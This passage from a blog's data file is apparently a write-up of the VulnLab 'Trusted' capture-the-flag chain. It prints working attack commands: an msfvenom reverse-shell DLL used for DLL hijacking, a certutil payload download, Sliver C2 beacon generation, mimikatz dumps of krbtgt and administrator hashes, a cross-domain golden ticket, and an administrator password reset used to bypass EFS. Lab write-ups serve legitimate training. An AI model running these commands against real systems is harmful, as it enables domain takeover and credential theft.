to ensure that we move hastily upon seeing this. We may not know the timeframe when the `cpowers` user is going to execute values.\nAt the same time, this is a pen-testing lab, so I'm going to assume that there's a scheduled task running every now and then that will execute the file - just my logical thinking though.\n\nNot only that, but if we take a look at `cpowers` in Bloodhound, we can see that they're part of the Domain Admins group for this domain.\n\n![](/images/vulnlab/trusted-vl/i.jpg)\n\nThis means that if we compromise `cpowers`, we'll have full control over this domain controller.\n\nLet's examine this file to see if there's anything we can do to escalate our privileges when `cpowers` runs it. Normally I'd just transfer it using a C2 or by using a simple Python server on the Windows machine, however it seems I was unable to find success when trying either of them. Instead we can stand up our own SMB server using Impacket's `smbserver` utility.\n\nKali - `impacket-smbserver smb share/ -smb2support`\nWinRM - `copy KasperskyRemovalTool.exe \\\\10.8.0.173\\smb\\KasperskyRemovalTool.exe`\n\nThis should download the AV tool into our `share/` directory (that we might need to create locally before setting up the SMB server).\n\nSo this next part was where I got confused, as examining this with tools such as Ghidra didn't result in many finds. Usually when it comes to reverse engineering PE32 binaries, you'd want to look specifically at abnormal classes or functions or even DLLs that the binary uses that could be exploited. The only issue is that all of these binary functions for this file seem to be relatively normal or at least don't seem to be noteworthy enough to look into.\n\nLooking into CVE's didn't seem to get me anywhere either, but it started to get a few gears working as to what we could potentially do. https://www.exploit-db.com/exploits/10484\nWhile we know that the starting functions don't seem to be very important, what about the DLLs that are loaded while the file is running? Could these potentially be exploited?\n\nI decided to use ProcMon for this, as we can look specifically at the DLLs that are being ran after we execute the file and while it is running.\nNote that I was running my machine through a Kali Linux VM, so I'll need to transfer it to my local Windows 10 host in order to examine it with ProcMon.\n\n# ProcMon Executable Reverse Engineering\n\nThere are alternatives to setting up ProcMon for Linux, however I was unable to get it working when I had tried it out initially. I'll still leave the link for it as provided here: https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\n\n![](/images/vulnlab/trusted-vl/j.jpg)\n\nBefore we run the file, we should make sure that we have the right filters set up since we'll get barraged with internal functions and files that the binary will use during runtime. Go to `Filter > Filter` (or just press `Ctrl + l`\n\nOn this screen, we can create filters to view only a section of processes and/or functions that interest us.\n\n![](/images/vulnlab/trusted-vl/k.jpg)\n\nFor simplicities sake, I've outlined the filter parameters that we'll need to detect the processes of interest.\n\n`Process Name - contains - Kaspersky -> then Include`\n`Path - ends with - .dll -> then Include`\n\nRunning the file with these two filters still leaves us with a barrage of information, however you'll notice that many of the DLLs have a `Result` value of `NAME NOT FOUND`. This is particularly interesting, as the `File Path` for the DLL is within the same directory of the binary that was executed.\n\nWe'll also put down these results as another filter to see specifically what DLLs these results entail.\n\n`Result - is - NAME NOT FOUND -> then Include`\n\n![](/images/vulnlab/trusted-vl/l.jpg)\n\nThere are a numerous amount of DLLs that are executed within the same directory as the binary (my binary is located in `Downloads\\kas\\`). This presents us with a vulnerability that is also new for my research - DLL Hijacking.\n\n# DLL Hijacking\n\nDLL Hijacking is a Windows application vulnerability that essentially allows an attacker to load malicious DLLs into a process in place of regular DLLs. This can occur in the situation in front of us - when a binary uses DLLs that are located within a modifiable directory that we have access to. By replacing a normal DLL that is used, we can trick the Windows API into running our malicious DLL.\n\nI plan on making a research post about DLL Hijacking in the future, however in the meantime I've referenced a HackTricks post that illustrates it relatively well.\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\n\nSo in that case let's give it a try. We'll start by creating a malicious DLL with `msfvenom`, which can be done using the following command. I initially tried this with replacing `USP10.dll`, however I found that it wouldn't spawn a reverse shell as intended. Instead, we'll use the `KasperskyRemovalToolENU.dll` that is called multiple times during runtime.\n`msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f dll > KasperskyRemovalToolENU.dll`\n\nWe'll then set up a Python web server with `python3 -m http.server 9002` to transfer the file.\nAlso, we'll set up a netcat reverse shell so that when `cpowers` executes the Kaspersky tool binary, we'll get a callback after our malicious DLL is ran.\n\nOn Kali - `nc -lvnp 9001`\nOn WinRM - `certutil.exe -urlcache -f http://10.8.0.173:9002/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll`\n\nAfter a few seconds of waiting, our netcat listener should spawn a reverse shell as `cpowers`.\n\n![](/images/vulnlab/trusted-vl/m.jpg)\n\nSince we are now a DA, we can read the user flag that is present in the `Administrator` directory.\n\n`PS C:\\Windows\\system32> cd C:\\Users\\Administrator\\Desktop; cat User.txt`\n\nFrom here, I stood up a Sliver C2 server to try and enumerate the other domain a little easier.\n\nNote that we couldn't do this previously as `ewalters`, as there was a GPO that restricted us from doing so.\nIf you're unaware on how to set up a Sliver C2 server, I'll reference the material needed to do so here: https://github.com/BishopFox/sliver\n`sliver > mtls`\n`generate beacon --mtls 10.8.0.173 --os windows --format exe --arch amd64 --skip-symbols --save (directory of your choice)`\n\nAfter transferring the file and running it on our reverse shell, we should see a session spawn on Sliver.\n\n![](/images/vulnlab/trusted-vl/n.jpg)\n\nSo to start, my first guess is that there's some form of domain trust amongst both domain controllers. I had said this earlier in the machine, just based off the chain's name `Trusted`. There's two (technically three) methods that I know of to enumerate a domain, consisting across all of the shells we have access to.\n\n# Domain Trust Enumeration\n\nWe can enumerate the domain locally with `Get-ADTrust`, a regular PowerShell module that is present on this machine. \n`Get-ADTrust -Filter *`\n\nAnother is to drop `PowerView` to the machine and then import it.\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\n`Import-Module .\\PowerView.ps1; Get-DomainTrust`\n\nFinally, we can also use `sharpview`, a .NET version of `PowerView` that is present in Sliver's `armory` function.\n`sliver > armory install sharpview`\n`sliver > sharpview Get-Domain`\nThe only issue with `sharpview` is that I was running into an LDAP issue (when running `Get-DomainTrust`, so I'll just use the local `PowerView` option we discussed about previously.\n\nAfter running `Get-DomainTrust` or `Get-ADTrust`, we receive the following output.\n\n![](/images/vulnlab/trusted-vl/o.jpg)\n\nThis means that there is a `Bidirectional` domain trust between both the child domain `lab.trusted.vl` and the parent domain `trusted.vl`. What this essentially means is that both domains `lab.trusted.vl` and `trusted.vl` trust one another - meaning that if you are a Domain Admin in one of the domains, you can also create a TGT for a Domain Admin in the other.\n\nI'd like to create a blog post about this in the future, as the term for this is called `Domain Dominance` and is relatively interesting how you can compromise domains through domain trusts. You can also verify this in `Bloodhound` by looking at the `Map Domain Trusts` in the `Analysis` tab.\n\n![](/images/vulnlab/trusted-vl/p.jpg)\n\nThis also means that we can create a Golden ticket through Kerberos that can be used across both domains. For context, a Golden ticket is a forged TGT, which is signed by the respective domain's `krbtgt` service account. This ticket can be used to impersonate any user, on any service, to every machine on the domain (or within the domain trust!). What also makes this incredibly powerful is that the credentials are never changed automatically. This means that if you have the `krbtgt` AES or NTLM hash, you can essentially perform almost any domain attack that you'd like (such as `dcsync` as an example).\n\nIn order to exploit the domain trust, we'll need three different things: \n* The `NTLM` of the `krbtgt` domain object.\n* The `LAB` domain object SID.\n* The `TRUSTED` domain object SID for the `Enterprise Admins` group.\n\nIn order to get all three of those, we can use `mimikatz` to dump all of this information. Generally we'd want to try and get `mimikatz` past AV by utilizing a C2 or by process injection, however we won't need to do this since Defender is not enabled for this chain.\n\n# Golden Ticket to DC2\n\nThus, we can just drop `mimikatz` to disk and run it through the DC. https://github.com/ParrotSec/mimikatz\n\n```\nsliver > upload mimikatz.exe\n\nC:\\Users\\cpowers\\Documents> .\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /user:krbtgt /patch\" \"exit\"\n```\n\nThis gives us the `krbtgt` NTLM hash as well as the `LAB` domain SID.\nIn order to get the domain SID of the `TRUSTED` domain, we can use a built-in PowerShell cmdlet call `Get-ADGroup`.\n\n```\nPS C:\\Users\\cpowers\\Documents> Get-ADGroup -Filter {name -eq \"Enterprise Admins\"} -Server trusted.vl\n```\n\nTry not to do this through `Evil-WinRM`, I ran into some domain resolution issues and instead found better luck by running it through a reverse shell.\nWe now have the following information in order to build our Golden ticket.\n\n```\nNTLM Hash     - [...snip...]\nLAB SID       - S-1-5-21-2241985869-2159962460-1278545866\nTRUSTED SID   - S-1-5-21-3576695518-347000760-3731839591-519\nTarget Domain - trusted.vl\n\n> impacket-ticketer -nthash [...snip...] -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator\n```\n\nThis saves our Golden ticket as a new file called `Administrator.ccache`. We'll need to set this as a global variable on our Kali machine to use this to authenticate with Kerberos on the parent domain.\n\nOnce all of this is completed, we can use `psexec` to spawn a shell in this domain as the `Administrator` user. Reminder to use the `FQDN` (Fully Qualified Domain Name) of the parent domain controller, which is `trusteddc.trusted.vl`.\n\n```\n> export KRB5CCNAME=Administrator.ccache\n\n> impacket-psexec lab.trusted.vl/Administrator@trusteddc.trusted.vl -k -no-pass -target-ip 10.10.197.213\n```\n\nThis will open up a remote shell through `PsExec` on the `TRUSTEDDC` domain controller a `SYSTEM`, meaning we have completed this chain! Is what I hoped.\n\n![](/images/vulnlab/trusted-vl/q.jpg)\n\nYou'll notice that if you try to read the `root.txt`, we don't have the permissions to read it. Which if we think about it, doesn't make sense right? We're `SYSTEM` yet we don't have permissions to read the file.\n\nMy guess is that there are privileges that restricting us from accessing this file, meaning we need to use . To save some time (in the screenshot above as you'll notice), I used `mimikatz` to dump the Administrator hash and log-in with it through WinRM, however this STILL did not let us access the file.\n\n`C:\\Users\\Administrator\\Desktop> .\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /user:Administrator /patch\" \"exit\"\n`evil-winrm --ip 10.10.197.213 -u 'Administrator' -H '[...snip...]'` (with Administrator NTLM hash)\n\nIf you run `cipher /u /n` on the machine, you'll notice that the `root` flag is encrypted with `EFS`.\n\n![](/images/vulnlab/trusted-vl/r.jpg)\n\n# EFS Bypass as SYSTEM\n\nEFS (Encrypted File System) is a built-in Windows encryption feature that allows you to encrypt files or directories to prevent other users from opening them. This produces a certificate, which is required to be present in your current session in order to decrypt the encrypted file and read it.\n\nI also plan on creating a blog post based on `EFS` file decryption, as there's other bypasses aside from the one you'll see in a few moments.\n\nTo bypass this, we can use `runasCs` to circumvent the `EFS` encryption and read the flag as we  would normally.\nWe'll also need to change the `Administrator`'s user password in order to use `runasCs`, which is really simple now that we have access to command-line session as this user.\n\n`net user administrator \"password123@\"`\nhttps://github.com/antonioCoco/RunasCs\n\nNote that you can just use the PowerShell module that comes in this GitHub package, and just import it. Make sure to also upload this in a directory other than the `Administrator` directory, as this entire directory under the `EFS` encryption rule.\n\n```\nsliver > upload RunasCs/Invoke-RunasCs.ps1\n\n*Evil-WinRM* PS C:\\Users\\Public\\Desktop> Import-Module .\\Invoke-RunasCs.ps1; Invoke-RunasCs administrator \"password123@\" \"cmd.exe /c type C:\\users\\administrator\\desktop\\root.txt\"\n```\n\nThis will open the file and allow us to read the contents of the `root` flag. Thus, we have completed this chain!\n\n# Conclusion\n\nBig thanks to `r0BIT` for creating this chain, as it was extremely helpful in understanding Domain Dominance and EFS encryption. Helped a lot to help myself understand these topics and how to perform them mainly through Kali (and with some help through Mimikatz).\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://www.exploit-db.com/exploits/10484\nhttps://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\nhttps://github.com/BishopFox/sliver\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\nhttps://github.com/ParrotSec/mimikatz\nhttps://github.com/antonioCoco/RunasCs\n","slug":"trusted","published":1,"updated":"2024-06-05T20:03:12.539Z","_id":"clx298b4g00003quf2ydfe7ua","comments":1,"layout":"post","photos":[],"content":"<p>This chain was relatively fun, however it’s a REALLY long one. That being said I still think it was a great learning experience, as I’ve learned how to perform pen-testing exploits that I’ve only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Running our NMAP scans for host discovery for both machines.<br><code>sudo nmap (IP) -A -oN init_scan_(1/2).txt</code><br>Also note, the IP addresses might change due to some breaks I take in between completing this chain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Nmap scan report for 10.10.155.37</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">Not shown: 988 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">53/tcp   open  domain        Simple DNS Plus</span><br><span class=\"line\">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:42:14Z)</span><br><span class=\"line\">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">445/tcp  open  microsoft-ds?</span><br><span class=\"line\">464/tcp  open  kpasswd5?</span><br><span class=\"line\">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class=\"line\">636/tcp  open  tcpwrapped</span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">3269/tcp open  tcpwrapped</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=trusteddc.trusted.vl</span><br><span class=\"line\">| Not valid before: 2024-04-30T15:22:54</span><br><span class=\"line\">|_Not valid after:  2024-10-30T15:22:54</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: TRUSTED</span><br><span class=\"line\">|   NetBIOS_Domain_Name: TRUSTED</span><br><span class=\"line\">|   NetBIOS_Computer_Name: TRUSTEDDC</span><br><span class=\"line\">|   DNS_Domain_Name: trusted.vl</span><br><span class=\"line\">|   DNS_Computer_Name: trusteddc.trusted.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-05-01T15:42:31+00:00</span><br><span class=\"line\">|_ssl-date: 2024-05-01T15:42:40+00:00; +2s from scanner time.</span><br><span class=\"line\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class=\"line\">TCP/IP fingerprint:</span><br><span class=\"line\">OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41302%PV=Y%DS=2%DC=T%G=Y%TM=66326</span><br><span class=\"line\">OS:2F1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS</span><br><span class=\"line\">OS:=A)SEQ(SP=FF%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=</span><br><span class=\"line\">OS:109%TI=RD%CI=I%II=I%TS=C)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D4NW8NNT</span><br><span class=\"line\">OS:11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF</span><br><span class=\"line\">OS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC=Y%Q=)T</span><br><span class=\"line\">OS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%</span><br><span class=\"line\">OS:O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80</span><br><span class=\"line\">OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q</span><br><span class=\"line\">OS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A</span><br><span class=\"line\">OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R</span><br><span class=\"line\">OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class=\"line\"></span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: 2024-05-01T15:42:33</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   3:1:1: </span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 443/tcp)</span><br><span class=\"line\">HOP RTT       ADDRESS</span><br><span class=\"line\">1   105.46 ms 10.8.0.1</span><br><span class=\"line\">2   105.84 ms 10.10.155.37</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 169.08 seconds</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap scan report for 10.10.155.38</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">Not shown: 985 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">53/tcp   open  domain        Simple DNS Plus</span><br><span class=\"line\">80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)</span><br><span class=\"line\">|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6</span><br><span class=\"line\">| http-title: Welcome to XAMPP</span><br><span class=\"line\">|_Requested resource was http://10.10.155.38/dashboard/</span><br><span class=\"line\">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:43:08Z)</span><br><span class=\"line\">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=localhost</span><br><span class=\"line\">| Not valid before: 2009-11-10T23:48:47</span><br><span class=\"line\">|_Not valid after:  2019-11-08T23:48:47</span><br><span class=\"line\">|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6</span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/1.1</span><br><span class=\"line\">| http-title: Welcome to XAMPP</span><br><span class=\"line\">|_Requested resource was https://10.10.155.38/dashboard/</span><br><span class=\"line\">445/tcp  open  microsoft-ds?</span><br><span class=\"line\">464/tcp  open  kpasswd5?</span><br><span class=\"line\">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class=\"line\">636/tcp  open  tcpwrapped</span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">3269/tcp open  tcpwrapped</span><br><span class=\"line\">3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB</span><br><span class=\"line\">| mysql-info: </span><br><span class=\"line\">|   Protocol: 10</span><br><span class=\"line\">|   Version: 5.5.5-10.4.24-MariaDB</span><br><span class=\"line\">|   Thread ID: 9</span><br><span class=\"line\">|   Capabilities flags: 63486</span><br><span class=\"line\">|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SupportsTransactions, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class=\"line\">|   Status: Autocommit</span><br><span class=\"line\">|   Salt: n;xn=$:7D2kEU_Z&#x27;SJ[i</span><br><span class=\"line\">|_  Auth Plugin Name: mysql_native_password</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">|_ssl-date: 2024-05-01T15:43:35+00:00; +2s from scanner time.</span><br><span class=\"line\">| ssl-cert: Subject: commonName=labdc.lab.trusted.vl</span><br><span class=\"line\">| Not valid before: 2024-04-30T15:22:56</span><br><span class=\"line\">|_Not valid after:  2024-10-30T15:22:56</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: LAB</span><br><span class=\"line\">|   NetBIOS_Domain_Name: LAB</span><br><span class=\"line\">|   NetBIOS_Computer_Name: LABDC</span><br><span class=\"line\">|   DNS_Domain_Name: lab.trusted.vl</span><br><span class=\"line\">|   DNS_Computer_Name: labdc.lab.trusted.vl</span><br><span class=\"line\">|   DNS_Tree_Name: trusted.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-05-01T15:43:26+00:00</span><br><span class=\"line\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class=\"line\">TCP/IP fingerprint:</span><br><span class=\"line\">OS:SCAN(V=7.94SVN%E=4%D=5/1%OT=53%CT=1%CU=41334%PV=Y%DS=2%DC=T%G=Y%TM=66326</span><br><span class=\"line\">OS:329%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%T</span><br><span class=\"line\">OS:S=A)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%I</span><br><span class=\"line\">OS:SR=105%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M4D4NW8ST11%O2=M4D4NW8ST11%O3=M4D</span><br><span class=\"line\">OS:4NW8NNT11%O4=M4D4NW8ST11%O5=M4D4NW8ST11%O6=M4D4ST11)WIN(W1=FFFF%W2=FFFF%</span><br><span class=\"line\">OS:W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4D4NW8NNS%CC</span><br><span class=\"line\">OS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=</span><br><span class=\"line\">OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF</span><br><span class=\"line\">OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=</span><br><span class=\"line\">OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=</span><br><span class=\"line\">OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI</span><br><span class=\"line\">OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class=\"line\"></span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: 2024-05-01T15:43:29</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   3:1:1: </span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 143/tcp)</span><br><span class=\"line\">HOP RTT       ADDRESS</span><br><span class=\"line\">1   105.77 ms 10.8.0.1</span><br><span class=\"line\">2   105.78 ms 10.10.155.38</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 42.35 seconds</span><br></pre></td></tr></table></figure>\n\n<p>After our initial NMAP scan, we can see there are two devices that are up. Both have LDAP and are a part of a domain. Both of these machines seem to be domain controllers, the first being <code>trusteddc.trusted.vl</code> and the second being <code>labdc.lab.trusted.vl</code>. On the second machine, it seems that we have port 80 open, so we’ll look at that for the foothold of our attack path. Would like to note that the name of the chain is <code>Trusted</code> and we have two DCs, meaning we’ll probably have to exploit some form of domain trust or delegation between the two DCs.</p>\n<p>Upon enumerating the website, we’ve seem to have found a landing page for XAMPP&#x2F;Maria DB (MySQL). Would like to note that port 3306 <code>MySQL</code> is open on this machine.<br><code>gobuster dir -u http://10.10.155.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/img                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/img/]</span><br><span class=\"line\">/dev                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/dev/]</span><br><span class=\"line\">/examples             (Status: 503) [Size: 401]</span><br><span class=\"line\">/licenses             (Status: 403) [Size: 420]</span><br><span class=\"line\">/dashboard            (Status: 301) [Size: 340] [--&gt; http://10.10.155.38/dashboard/]</span><br><span class=\"line\">/%20                  (Status: 403) [Size: 301]</span><br><span class=\"line\">/IMG                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/IMG/]</span><br><span class=\"line\">/*checkout*           (Status: 403) [Size: 301]</span><br><span class=\"line\">/Img                  (Status: 301) [Size: 334] [--&gt; http://10.10.155.38/Img/]</span><br><span class=\"line\">/phpmyadmin           (Status: 403) [Size: 301]</span><br><span class=\"line\">/webalizer            (Status: 403) [Size: 301]</span><br><span class=\"line\">/*docroot*            (Status: 403) [Size: 301]</span><br><span class=\"line\">/*                    (Status: 403) [Size: 301]</span><br><span class=\"line\">/con                  (Status: 403) [Size: 301]</span><br><span class=\"line\">/Dashboard            (Status: 301) [Size: 340] [--&gt; http://10.10.155.38/Dashboard/]</span><br></pre></td></tr></table></figure>\n\n<p>The <code>dev</code> directory seems to be relatively interesting, as I don’t commonly see these on default Apache websites. Navigating to it seems to direct us to a website titled <code>Manes Winchester Family Law Firm</code>, with directories <code>Home</code>, <code>About</code>, and <code>Contact</code>. Not only that, but it seems that we immediately see a message on the bottom of the <code>Home</code> page from one of the web developers.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/b.jpg\"></p>\n<p>This gives me confidence in assuming that with all we know, the attack path is some form of SQL vulnerability (could be SQL injection or by exploiting the <code>mysql_native_password</code> authentication plugin). Let’s try to look around the website some more and see if we can find any SQL vulnerabilities, I’ll enumerate a bit and see what I can find.</p>\n<p>Let’s run a <code>gobuster</code> scan against <code>/dev</code> to see if we can find this database connection.<br><code>gobuster dir -u http://10.10.155.38/dev -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x &#39;php&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/images               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/images/]</span><br><span class=\"line\">/Images               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/Images/]</span><br><span class=\"line\">/css                  (Status: 301) [Size: 338] [--&gt; http://10.10.155.38/dev/css/]</span><br><span class=\"line\">/db.php               (Status: 200) [Size: 22]</span><br><span class=\"line\">/IMAGES               (Status: 301) [Size: 341] [--&gt; http://10.10.155.38/dev/IMAGES/]</span><br><span class=\"line\">/%20                  (Status: 403) [Size: 301]</span><br><span class=\"line\">/*checkout*           (Status: 403) [Size: 301]</span><br><span class=\"line\">/*checkout*.php       (Status: 403) [Size: 301]</span><br><span class=\"line\">/CSS                  (Status: 301) [Size: 338] [--&gt; http://10.10.155.38/dev/CSS/]</span><br><span class=\"line\">/*docroot*            (Status: 403) [Size: 301]</span><br><span class=\"line\">/*docroot*.php        (Status: 403) [Size: 301]</span><br><span class=\"line\">/DB.php               (Status: 200) [Size: 22]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PHP-SQLi\"><a href=\"#PHP-SQLi\" class=\"headerlink\" title=\"PHP SQLi\"></a>PHP SQLi</h1><p>Usually whenever you look around for SQL Injection, you’re mainly looking for a parameter to inject content into, such as 